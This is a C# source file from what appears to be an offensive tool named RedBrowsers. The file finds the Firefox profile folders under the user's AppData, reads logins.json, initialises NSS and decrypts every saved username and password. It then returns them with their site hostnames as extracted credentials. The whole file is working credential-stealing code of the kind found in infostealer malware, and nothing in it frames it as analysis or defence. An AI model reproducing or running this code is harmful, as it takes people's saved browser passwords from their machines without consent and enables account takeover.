using System.Web.Script.Serialization;
using System;
using System.Collections.Generic;
using System.IO;
using RedBrowsers.Utlis;

namespace RedBrowsers.Firefox
{
    class FirefoxStorage 
    {
        public static List<ExtractedCredentials> ReadPasswords()
        {
       
            string loginsFile = null;
            bool loginsFound = false;
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<ExtractedCredentials>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                // find logins.json file
                string[] files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound )
                {
                    FFDecryptor.NSS_Init(dir);
                    break;
                }
            }

            if (loginsFound)
            {
                FFLogins ffLoginData;
                using (StreamReader sr = new StreamReader(loginsFile))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = new JavaScriptSerializer().Deserialize<FFLogins>(json);
                }

                foreach (LoginData loginData in ffLoginData.logins)
                {
                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                    logins.Add(new ExtractedCredentials
                    {
                        UserName = username,
                        Password = password,
                        URL = loginData.hostname,
                        Application = "Firefox"

                    });
                }
            }
            return logins;
        }

    }
}
